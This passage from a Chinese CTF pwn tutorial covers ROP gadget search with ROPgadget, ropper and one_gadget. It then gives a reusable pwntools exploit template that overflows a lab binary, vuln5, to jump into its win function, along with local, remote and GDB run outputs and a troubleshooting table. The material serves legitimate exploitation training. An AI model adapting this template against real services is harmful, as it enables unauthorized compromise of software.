==插件不改原理==：断点仍是 int3、单步仍是单步陷阱、读内存仍是同一套 ptrace 机制（[[R06-动态调试GDB与x64dbg#3. 断点|R06 第 3 节]]讲过底层）。它们做的是把"停下之后要看的东西"排版好、把常用操作起个短名。==先把 R06 的原生命令练熟再用插件==，否则停下之后既不知道面板上哪一行是返回地址，也不知道该敲什么。

pwndbg 与 pwntools 配合的一个细节：pwndbg 内置了 `cyclic` 命令，生成与反查和 pwntools 同一套算法——装了插件后，第 8 节"生成模式串、从崩溃现场反查偏移"整个动作可以不出 GDB 完成。

## 10. gadget 搜索：ROPgadget、ropper、one_gadget

**ROPgadget 是什么**：在二进制里扫描"以 `ret` 结尾的指令片段"（gadget）并按地址列出。[[P01-PWN导论与缓解机制全景#6. 题目分类概览|P1 第 6 节]]提过 gadget 是 ROP 链的基本单元；[[P06-栈溢出原理与ret2win|P6]]起构造链时，第一步就是搜出需要的片段。

**什么时候用**：确定了"需要让 rdi 等于某值再跳走"这类需求后，去目标文件（主程序或它链接的 libc）里找现成片段。

**最小用法**——在 vuln5 上搜以 `pop` 或 `ret` 结尾的片段：

```bash
ROPgadget --binary vuln5 --only "pop|ret"
```

输出：

```
Gadgets information
============================================================
0x000000000040117d : pop rbp ; ret
0x0000000000401196 : pop rdi ; ret
0x000000000040101a : ret
0x000000000040105a : ret 0xffff

Unique gadgets found: 4
```

`pop rdi ; ret` 在 0x401196——但要有数：==它来自源码里那段内联汇编，是特意放进去的==。正常编译的程序函数少、代码短，往往搜不到带参数寄存器的片段；真实利用里 `pop rdi; ret` 的常规来源是 libc——gadget 数量大得多，`ROPgadget --binary libc.so.6` 配合 grep 过滤是常态，具体搜法与用法 [[P07-ret2libc-ret2syscall-ret2shellcode|P7]]展开。

常用参数：

| 参数 | 作用 |
| ---- | ---- |
| `--binary 文件` | 指定扫描目标（主程序、libc 都行） |
| `--only "正则"` | 只保留以这些指令结尾的片段；`--only "pop\|ret"` 是最高频写法 |
| `--depth N` | 片段最多串几条指令，默认 10 |

`--depth` 影响结果数量，同一个 vuln5：`--depth 5` 找到 35 条，默认（10）78 条，`--depth 15` 106 条。==搜不到想要的片段时先把 depth 加大再下结论==。

**ropper**：与 ROPgadget 同类的另一款工具，交互式搜索、也支持把片段串成链的辅助生成，装法 `python3 -m pip install ropper`，会一家另一家顺手。

**one_gadget 是什么**：在 libc 里直接搜"一条地址跳过去就能 `execve("/bin/sh", ...)`"的现成位置。普通 ROP 拿 shell 要串好几段 gadget，one_gadget 候选一个地址搞定，[[P07-ret2libc-ret2syscall-ret2shellcode|P7]]与 [[P08-ROP进阶与SROP|P8]]都会用到。

它的核心概念是**约束（constraint）**：这些位置能一站工作，前提是跳进去那一刻某些寄存器或栈位置满足条件（形如 `[rsp+0x40] == NULL`、`rbp` 为某个值之类），不满足则 `execve` 失败。one_gadget 的输出就是"候选地址 + 各自的约束清单"，做题时==要么找到恰好满足约束的时机，要么在链上垫指令凑条件==。

**装法**：依赖 Ruby，`sudo apt install ruby && sudo gem install one_gadget`（工具清单见 [[01-Linux环境与CTF实验环境搭建#5.3 其他常用工具（随用随装）|01 章 5.3]]），装好后 `one_gadget libc.so.6` 列出候选。

## 11. 实战：封装个人 exploit 模板

五步流程每题都走，脚本形态也高度重复：设 context、加载 ELF、起连接、发 payload、收结果。把这层壳抽出来固定成模板，==每道新题只改"题目信息"和"exploit 主体"两块==。下面是一份可直接落盘的 `template.py`，本地与远程都已跑通：

```python
#!/usr/bin/env python3
# template.py —— 个人 exploit 模板
# 用法：
#   python3 template.py LOCAL                            打本地
#   python3 template.py REMOTE HOST=127.0.0.1 PORT=1337  打远程
#   python3 template.py LOCAL DBG                        打本地并抓 GDB 崩溃现场
from pwn import *
import subprocess

# ===== 题目信息：换题只改这一块 =====
BIN    = './vuln5'
OFFSET = 72
e = ELF(BIN, checksec=False)

# ===== 全局设定：跟随二进制自动填 arch/bits/endian/os =====
context.binary = e
context.log_level = 'info'

# ===== 连接：LOCAL 走本地进程，其余走远程 =====
def start():
    if args.LOCAL:
        return process(BIN)
    return remote(args.HOST or '127.0.0.1', int(args.PORT or 1337))

# ===== 调试：批处理抓崩溃现场（8.2 的封装） =====
GDBSCRIPT = '''set confirm off
run < payload.bin
info registers rip rsp
x/gx $rsp
quit
'''
def debug(payload):
    open('payload.bin', 'wb').write(payload)
    open('gdb.cmds', 'w').write(GDBSCRIPT)
    subprocess.run(['gdb', '-q', '-batch', '-x', 'gdb.cmds', BIN])

# ===== exploit 主体 =====
def exploit(io):
    payload = flat(b'A' * OFFSET, e.symbols['win'])
    io.recvuntil(b'name> ')
    io.sendline(payload)
    return io.recvline()

if __name__ == '__main__':
    if args.DBG:
        debug(flat(b'A' * OFFSET, e.symbols['win']))
    else:
        io = start()
        result = exploit(io)
        success(result.decode().strip())
        io.close()
```

逐段讲解：

- **题目信息区**：`BIN`、`OFFSET` 换题就改；`e = ELF(BIN, checksec=False)` 加载二进制，地址一律写 `e.symbols['…']`、`e.plt['…']`，不在代码里写死十六进制（`checksec=False` 只是关掉加载时的判读打印）。
- **`context.binary = e`**：一行把架构、位宽、字节序、系统全部对齐到目标二进制，是第 2 节逐字段设定的打包写法。之后 `flat()` 自动按 64 位打包。
- **`args` 与 `start()`**：pwntools 会把命令行上的"独立单词"和 `KEY=值` 收进全局的 `args` 对象——`args.LOCAL` 是"命令行里有没有 LOCAL 这个词"，`args.HOST` 是 `HOST=` 后面的值。==本地调通后打远程，只是命令行把 `LOCAL` 换成 `REMOTE HOST=… PORT=…`，脚本一字不改==。
- **`debug()`**：第 8.2 节批处理姿势的封装，payload 传进来，落盘、生成命令文件、跑一次 GDB。用 `python3 template.py LOCAL DBG` 调用。
- **`exploit(io)`**：题目逻辑全部集中在这一个函数，收发用 `recvuntil`/`sendline`，构造用 `flat`。
- **收尾**：`success()` 是 pwntools 的日志函数，打 `[+]` 前缀的一行；需要人工交互时把最后几行换成 `io.interactive()`。

三种跑法的输出。本地：

```bash
python3 template.py LOCAL
```

输出：

```
[x] Starting local process './vuln5'
[+] Starting local process './vuln5': pid 547
[+] [win] called
[*] Stopped process './vuln5' (pid 547)
```

远程（服务端用 [[P01-PWN导论与缓解机制全景#5.6 第五步：打远程|P1 5.6]]的 serve.py 换成 vuln5 起在 1337 端口）：

```bash
python3 template.py REMOTE HOST=127.0.0.1 PORT=1337
```

输出：

```
[x] Opening connection to 127.0.0.1 on port 1337
[x] Opening connection to 127.0.0.1 on port 1337: Trying 127.0.0.1
[+] Opening connection to 127.0.0.1 on port 1337: Done
[+] [win] called
[*] Closed connection to 127.0.0.1 port 1337
```

带调试：

```bash
python3 template.py LOCAL DBG
```

输出：

```
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".
name> [win] called

Program received signal SIGSEGV, Segmentation fault.
0x00007fffffffe200 in ?? ()
rip            0x7fffffffe200      0x7fffffffe200
rsp            0x7fffffffe168      0x7fffffffe168
0x7fffffffe168:	0x00007ffff7c2a601
```

这份现场信息量不小：`[win] called` 出现在崩溃之前——==ret 确实跳进了 win==；随后崩掉的 rip 是一个栈地址（0x7fffffffe200），说明 win 自己的 `ret` 弹到了 payload 之外没人控制的旧数据上。这正是 [[P01-PWN导论与缓解机制全景#5.5 第四步：构造利用链|P1 5.5]]说的"flag 到手、收尾崩溃不影响结果"，在 GDB 现场里能亲眼看到整个过程。

> [!note] pwntools 自带的骨架生成器
> `pwn template ./binary` 会生成一份官方骨架脚本，结构与本模板同族：`exe = context.binary = ELF(...)`、`args.GDB` 切调试、`gdbscript` 变量、`start()` 函数。两份对照着看，字段含义一目了然；本模板的差异是把调试换成了不依赖终端的批处理姿势。

## 12. 常见问题

| 现象 | 原因与解决 |
| ---- | ---- |
| `recvuntil` 卡住不返回 | 等的标记和程序实际输出对不上：提示符后有没有空格、换行有没有差异。用 `context.log_level='debug'` 看收发原文（第 2 节折叠框），照着改标记 |
| 下一个 recv 抛 `EOFError` | 对端已关：多半是 payload 打崩了程序，或读的时机太晚。先用第 8 节的现场确认程序死在哪 |
| `flat()` 拼出来的地址只有 4 字节 | context 还是默认 i386。开头加 `context.arch='amd64'` 或用 `context.binary = e` |
| `p64` 想打 8 字节却手滑用了 `p32` | 64 位地址一律 `p64` 或 `flat`；解泄露值用 `u64` |
| `cyclic_find` 报 pattern not found | 反查值不是串里的内容：取漏了、取错位置，或生成与反查的 `n` 不一致（第 6 节） |
| `ELF` 查符号报 `KeyError` | 程序 strip 过，符号表没了。地址用 IDA/objdump 定位后写成常量（[[R04-可执行文件格式ELF与PE#2.2 符号已删，地址还在\|R04 2.2]]） |
| `gdb.attach` 打印 Done 却没有任何调试界面 | 无终端环境下 GDB 在后台且附加被 ptrace 拦下（第 8 节）。换 tmux 姿势或批处理姿势 |
| ROPgadget 搜不到 `pop rdi` | 程序里真没有：先加大 `--depth`，再考虑去 libc 里搜（第 10 节，[[P07-ret2libc-ret2syscall-ret2shellcode\|P7]]） |
| `asm` 报汇编器错误 | binutils 缺对应架构支持，确认安装完整（[[01-Linux环境与CTF实验环境搭建#5.1 编译与调试\|01 章 5.1]]）；32 位记得先 `context.arch='i386'` |
| 题目附带一份 libc 文件，模板里怎么接 | 加载成 `libc = ELF('./libc.so.6', checksec=False)`，用泄露地址对齐版本后写 `libc.symbols['system']` 一类的查询；识别与匹配 [[P03-ELF链接与延迟绑定\|P3]] 展开 |

